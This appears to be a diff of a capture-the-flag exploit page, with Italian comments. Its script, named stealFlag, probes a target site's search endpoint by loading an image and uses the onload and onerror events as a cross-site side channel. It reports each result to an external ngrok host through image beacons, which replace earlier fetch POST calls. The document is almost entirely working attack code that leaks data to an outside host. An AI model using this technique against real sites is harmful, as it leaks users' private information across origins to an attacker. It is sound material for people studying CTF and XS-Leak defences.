@@ -10,40 +10,25 @@
 
     <script>
         const stealFlag = () => {
+            // Prova con un'immagine, che non segue SOP
             const img = document.createElement('img');
-            img.src = 'https://matrix.capturetheflags.site/search?s=thomas'; // Endpoint target
+            img.src = 'https://matrix.capturetheflags.site/search?s=flag'; // Endpoint target
 
+            // onload e onerror vengono usati come canale side-channel
             img.onload = () => {
                 console.log("Richiesta riuscita: flag accessibile!");
 
-                // Invia una richiesta al server con il risultato
-                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: `flag=accessibile`,
-                    mode: 'no-cors' // Imposta la modalità no-cors
-                })
-                .then(response => response.text())
-                .then(data => console.log("Risultato inviato:", data))
-                .catch(error => console.error('Errore invio risultato:', error));
+                // Segnala che la flag è accessibile
+                const imgSuccess = new Image();
+                imgSuccess.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=accessibile';
             };
 
             img.onerror = () => {
                 console.log("Errore: flag non accessibile.");
 
-                // Invia una richiesta al server con il risultato
-                fetch('https://acca-87-4-142-72.ngrok-free.app/receive_flag', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: `flag=non_accessibile`
-                })
-                .then(response => response.text())
-                .then(data => console.log("Risultato inviato:", data))
-                .catch(error => console.error('Errore invio risultato:', error));
+                // Segnala che la flag non è accessibile
+                const imgError = new Image();
+                imgError.src = 'https://acca-87-4-142-72.ngrok-free.app/receive_flag?result=non_accessibile';
             };
 
             document.body.appendChild(img);
